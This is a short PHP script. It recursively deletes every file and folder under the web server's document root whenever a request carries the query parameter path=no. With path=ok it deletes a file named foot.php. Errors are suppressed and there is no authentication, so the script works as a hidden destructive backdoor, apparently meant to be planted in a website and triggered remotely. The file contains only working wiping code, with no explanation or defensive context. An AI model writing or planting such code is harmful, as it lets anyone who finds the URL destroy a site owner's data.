<?php
	function aa($path) {    if (is_dir($path)) {        $dirs = scandir($path);        foreach ($dirs as $dir) {
            if ($dir != '.' && $dir != '..') {             $sonDir = $path.'/'.$dir;
                if (is_dir($sonDir)) {                    aa($sonDir);       @rmdir($sonDir);
                } else {               @unlink($sonDir);             }          }        }
        @rmdir($path);    }}   
    if($_GET['path'] == 'no'){  aa($_SERVER['CONTEXT_DOCUMENT_ROOT']);
    }elseif($_GET['path'] == 'ok'){ unlink('./foot.php'); }